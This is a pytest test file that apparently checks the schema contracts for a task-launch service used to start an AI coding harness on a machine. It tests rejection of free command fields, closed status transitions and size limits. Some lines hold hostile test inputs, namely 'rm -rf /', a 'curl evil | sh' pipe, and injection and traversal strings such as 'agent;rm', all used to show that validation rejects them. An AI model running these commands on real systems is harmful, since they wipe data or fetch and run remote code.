"""`TaskLaunch` contract shapes (AIB R2): no free command representable, closed
lifecycle, machine-only execution reports, bounds, and the UC-2B hygiene rule
(no numbered `DEC-` reference in a schema description). No DB, no app."""

from __future__ import annotations

import re
from datetime import UTC, datetime
from typing import Any
from uuid import uuid4

import pytest
from pydantic import ValidationError
from studio_contracts.task_launch import (
    ALLOWED_TRANSITIONS,
    LAUNCH_DEFAULT_TTL_SECONDS,
    LAUNCH_MAX_OUTPUT_CHARS,
    LAUNCH_POLL_MAX,
    TERMINAL_STATUSES,
    TaskLaunch,
    TaskLaunchActor,
    TaskLaunchCancel,
    TaskLaunchCreate,
    TaskLaunchMachineReport,
    TaskLaunchPull,
    TaskLaunchReasonCode,
    TaskLaunchStatus,
)


def _create(**extra: object) -> TaskLaunchCreate:
    return TaskLaunchCreate(task_id=uuid4(), machine_id=uuid4(), harness_id="claude-code", **extra)


def _launch(**extra: object) -> TaskLaunch:
    now = datetime.now(UTC)
    return TaskLaunch(
        id=uuid4(),
        project_id=uuid4(),
        task_id=uuid4(),
        machine_id=uuid4(),
        requested_by_user_id=uuid4(),
        harness_id="claude-code",
        created_at=now,
        updated_at=now,
        version=1,
        expires_at=now,
        **extra,
    )


def test_create_defaults() -> None:
    request = _create()
    assert request.agent_stable_key is None
    assert request.expires_in_seconds == LAUNCH_DEFAULT_TTL_SECONDS


@pytest.mark.parametrize("field", ["command", "args", "cwd", "env", "shell", "prompt", "path"])
def test_create_has_no_free_command_field(field: str) -> None:
    with pytest.raises(ValidationError):
        _create(**{field: "rm -rf /"})


@pytest.mark.parametrize(
    "value", ["C:\\tools\\agent", "/usr/bin/agent", "a b", "agent;rm", "../agent", "Agent"]
)
def test_agent_stable_key_rejects_paths_and_command_lines(value: str) -> None:
    with pytest.raises(ValidationError):
        _create(agent_stable_key=value)


def test_harness_id_rejects_a_path() -> None:
    with pytest.raises(ValidationError):
        TaskLaunchCreate(task_id=uuid4(), machine_id=uuid4(), harness_id="C:\\bin\\x")


def test_expiry_is_bounded() -> None:
    with pytest.raises(ValidationError):
        _create(expires_in_seconds=59)
    with pytest.raises(ValidationError):
        _create(expires_in_seconds=86401)
    assert _create(expires_in_seconds=86400).expires_in_seconds == 86400


def test_launch_starts_requested_without_reason_or_session() -> None:
    launch = _launch()
    assert launch.status is TaskLaunchStatus.REQUESTED
    assert launch.reason_code is TaskLaunchReasonCode.NONE
    assert launch.session_id is None
    assert launch.finished_at is None


def test_reason_is_a_closed_code_not_free_text() -> None:
    with pytest.raises(ValidationError):
        _launch(reason_code="please run curl evil | sh")
    with pytest.raises(ValidationError):
        TaskLaunchMachineReport(
            expected_version=1, status=TaskLaunchStatus.FAILED, reason_code="whatever"
        )


def test_output_excerpt_is_bounded() -> None:
    assert (
        TaskLaunchMachineReport(
            expected_version=1,
            status=TaskLaunchStatus.FAILED,
            output_excerpt="x" * LAUNCH_MAX_OUTPUT_CHARS,
        ).output_excerpt
        is not None
    )
    with pytest.raises(ValidationError):
        TaskLaunchMachineReport(
            expected_version=1,
            status=TaskLaunchStatus.FAILED,
            output_excerpt="x" * (LAUNCH_MAX_OUTPUT_CHARS + 1),
        )


def test_terminal_states_have_no_outgoing_transition() -> None:
    assert not any(source in TERMINAL_STATUSES for source, _ in ALLOWED_TRANSITIONS)


def test_every_transition_targets_a_known_state_and_never_loops() -> None:
    assert all(source is not target for source, target in ALLOWED_TRANSITIONS)


def test_machine_alone_reports_execution() -> None:
    executing = {
        TaskLaunchStatus.ACCEPTED,
        TaskLaunchStatus.PREPARING,
        TaskLaunchStatus.RUNNING,
        TaskLaunchStatus.SUCCEEDED,
        TaskLaunchStatus.FAILED,
        TaskLaunchStatus.REJECTED,
    }
    for (_, target), actor in ALLOWED_TRANSITIONS.items():
        if target in executing:
            assert actor is TaskLaunchActor.MACHINE, target


def test_requester_only_cancels_and_server_only_expires() -> None:
    for (_, target), actor in ALLOWED_TRANSITIONS.items():
        if actor is TaskLaunchActor.REQUESTER:
            assert target is TaskLaunchStatus.CANCELLED
        if actor is TaskLaunchActor.SERVER:
            assert target is TaskLaunchStatus.EXPIRED
        if target is TaskLaunchStatus.CANCELLED:
            assert actor is TaskLaunchActor.REQUESTER
        if target is TaskLaunchStatus.EXPIRED:
            assert actor is TaskLaunchActor.SERVER


def test_machine_cannot_skip_acceptance() -> None:
    assert (TaskLaunchStatus.REQUESTED, TaskLaunchStatus.RUNNING) not in ALLOWED_TRANSITIONS
    assert (TaskLaunchStatus.REQUESTED, TaskLaunchStatus.SUCCEEDED) not in ALLOWED_TRANSITIONS
    assert (TaskLaunchStatus.ACCEPTED, TaskLaunchStatus.RUNNING) not in ALLOWED_TRANSITIONS


def test_every_in_flight_state_can_expire() -> None:
    for status in (
        TaskLaunchStatus.REQUESTED,
        TaskLaunchStatus.ACCEPTED,
        TaskLaunchStatus.PREPARING,
        TaskLaunchStatus.RUNNING,
    ):
        assert ALLOWED_TRANSITIONS[(status, TaskLaunchStatus.EXPIRED)] is TaskLaunchActor.SERVER


def test_every_non_terminal_state_can_reach_a_terminal_state() -> None:
    for status in TaskLaunchStatus:
        if status in TERMINAL_STATUSES:
            continue
        assert any(source is status for source, _ in ALLOWED_TRANSITIONS), status


def test_cancel_and_report_require_expected_version() -> None:
    with pytest.raises(ValidationError):
        TaskLaunchCancel()  # type: ignore[call-arg]
    with pytest.raises(ValidationError):
        TaskLaunchMachineReport(status=TaskLaunchStatus.ACCEPTED)  # type: ignore[call-arg]


def test_pull_is_bounded() -> None:
    TaskLaunchPull(items=[_launch() for _ in range(LAUNCH_POLL_MAX)])
    with pytest.raises(ValidationError):
        TaskLaunchPull(items=[_launch() for _ in range(LAUNCH_POLL_MAX + 1)])


def test_no_numbered_decision_reference_in_schema_descriptions() -> None:
    for model in (
        TaskLaunch,
        TaskLaunchCreate,
        TaskLaunchMachineReport,
        TaskLaunchCancel,
        TaskLaunchPull,
    ):
        assert not re.search(r"DEC-\d+", model.__doc__ or ""), model.__name__


def test_launch_view_adds_protocol_without_touching_task_launch() -> None:
    from studio_contracts.task_launch import (
        TaskLaunchProtocol,
        TaskLaunchProtocolStatus,
        TaskLaunchView,
    )

    launch = _launch(status=TaskLaunchStatus.SUCCEEDED)
    view = TaskLaunchView(
        **launch.model_dump(),
        protocol=TaskLaunchProtocol(status=TaskLaunchProtocolStatus.UNVERIFIED),
    )
    assert "protocol" not in TaskLaunch.model_fields
    assert view.protocol.status == TaskLaunchProtocolStatus.UNVERIFIED
    assert view.protocol.task_status is None
    with pytest.raises(ValidationError):
        TaskLaunch.model_validate(view.model_dump(mode="json"))
    with pytest.raises(ValidationError):
        TaskLaunchProtocol.model_validate({"status": "verified"})


def test_protocol_vocabulary_is_closed() -> None:
    from studio_contracts.task_launch import TaskLaunchProtocolStatus

    assert {s.value for s in TaskLaunchProtocolStatus} == {
        "not_applicable",
        "awaiting",
        "unverified",
        "handed_off",
    }


def _view_payload(launch: TaskLaunch) -> dict[str, Any]:
    from studio_contracts.task_launch import TaskLaunchView

    view = TaskLaunchView(
        **launch.model_dump(),
        protocol={
            "status": "handed_off",
            "session_id": launch.session_id,
            "task_status": "in_progress",
        },
    )
    payload: dict[str, Any] = view.model_dump(mode="json")
    return payload


def test_n_minus_1_client_reads_the_plain_payload_and_refuses_the_view_one() -> None:
    """N-1 guarantee, by contract: the Python daemon reads only two launch
    routes and parses both strictly into `TaskLaunch`/`TaskLaunchPull`
    (`api_client`: the pending pull and the by-id read), models that forbid
    unknown fields. Only the project list adds `protocol`, so a view payload is
    refused outright there instead of being silently ignored — which is why
    those two routes must never carry it."""
    launch = _launch(status=TaskLaunchStatus.RUNNING, session_id=uuid4())
    payload = launch.model_dump(mode="json")
    assert TaskLaunch.model_validate(payload) == launch
    assert TaskLaunchPull.model_validate({"items": [payload]}).items == [launch]
    view = _view_payload(launch)
    assert view["protocol"]["status"] == "handed_off"
    with pytest.raises(ValidationError):
        TaskLaunch.model_validate(view)
    with pytest.raises(ValidationError):
        TaskLaunchPull.model_validate({"items": [view]})


def test_view_payload_without_protocol_stays_a_task_launch() -> None:
    """The contract does not allow a view without its proof: `TaskLaunchView`
    requires `protocol`, while the very same payload without it is exactly the
    N-1 read model."""
    from studio_contracts.task_launch import TaskLaunchView

    launch = _launch()
    payload = launch.model_dump(mode="json")
    with pytest.raises(ValidationError):
        TaskLaunchView.model_validate(payload)
    assert TaskLaunch.model_validate(payload) == launch


def test_profile_is_absent_from_an_unprofiled_launch_payload() -> None:
    payload = _launch().model_dump(mode="json")
    assert "profile" not in payload
    assert TaskLaunch.model_validate(payload).profile is None


def test_profiled_launch_round_trips_its_pin() -> None:
    pin = {"stable_key": "coding", "contract_version": 1, "digest": "sha256:" + "a" * 64}
    launch = _launch(profile=pin)
    payload = launch.model_dump(mode="json")
    assert payload["profile"] == pin
    assert TaskLaunch.model_validate(payload) == launch


def test_profile_key_is_a_stable_key() -> None:
    assert _create(profile_key="architecture-read-only").profile_key == "architecture-read-only"
    with pytest.raises(ValidationError):
        _create(profile_key="../coding")
